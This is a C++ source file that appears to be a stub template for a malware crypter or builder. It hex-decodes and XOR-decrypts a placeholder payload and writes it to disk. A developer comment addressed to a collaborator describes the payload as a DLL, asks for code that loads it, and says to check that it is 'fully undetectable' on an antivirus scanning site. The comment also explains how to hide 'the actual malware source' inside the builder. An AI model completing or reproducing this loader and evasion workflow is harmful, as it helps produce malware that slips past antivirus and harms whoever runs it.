#include <iostream>
#include <vector>
#include <fstream>
#include <cstdint>
#include <iomanip>
#include <sstream>
#include <random>
#include <string>
    

void XOR(std::vector<uint8_t>& pyld, const std::vector<uint8_t>& key) {
    size_t keyLength = key.size();
    size_t dataLength = pyld.size();
    for (size_t i = 0; i < dataLength; ++i) {
        pyld[i] ^= key[i % keyLength];
    }
}

std::vector<uint8_t> dehex(const std::string& hexString) {
    std::vector<uint8_t> result;
    for (size_t i = 0; i < hexString.length(); i += 2) {
        uint8_t byte = std::stoi(hexString.substr(i, 2), nullptr, 16);
        result.push_back(byte);
    }
    return result;
}

int main() {
    std::string hexPayload = "AAA";
    std::string strKey = "BBB";
    std::vector<uint8_t> vectorPayload = dehex(hexPayload);
    std::vector<uint8_t> key = dehex(strKey);
    XOR(vectorPayload, key);
    std::ofstream outfile("loadDcipheredindecipgheredpayloadhere", std::ofstream::binary);
    outfile.write(reinterpret_cast<char*>(vectorPayload.data()), vectorPayload.size());
    outfile.close();
    return 0;
//sorry btw 


    /*
    You now have the payload stored as a vector in vectorPayload, it is the deciphered DLL payload 
    Below add your function to load the deciphered payload
    in Main.cpp at the end it calls the g++ compiler with a system command, this is not tested so if ther is any errors, 
    comment out any system() calls and just compile tmp.cpp to test it, is tmp.cpp is the temporary payload source containing
    this template but with the added stuff. When you are done test FUD on antiscan.me
    goodluck Baph ;P

    IMPORTANT P.S.

    Template.cpp contains the actual malware source before compilation. To avoid people stealing our source follow the steps below
    btw I would do all this but I couldn't until I got your part of the code

        1. Add your code to template
        2. In XORcist.cpp go to the comment with all the OOOOOOOOOOOO's 
        3. Delete everything until the next comment
        4. Use the hex function that I have written there to hex template.cpp (once you are finished with it of course)  std::string templateString = hex(template.cpp);
        5. go to the "next comment" from step 3 which is a bunch of capital text
        6. Create an std::string to hold the template string you just hexed (hexed version of template.cpp)
        std::string templateStuffy = hex(template.cpp);
        7. The capitalized commend tells you what is happening, essentially delete the two lines of code under it          
        8. Call dehex() on the string you just made to get the vector<uint8_t> of template.cpp in memory
            std::vector<uint8_t> templateVector = dehex(templateStuffy);

        9. Convert the vector to std::string 
            std::string content(templateVector.begin(), templateVector.end());

        10. this string should be named content

what this achieves is that the template code is now compiled into the builder, which makes it harder to steal
still easy but a lot less obvious and harder

    */
    return 0
}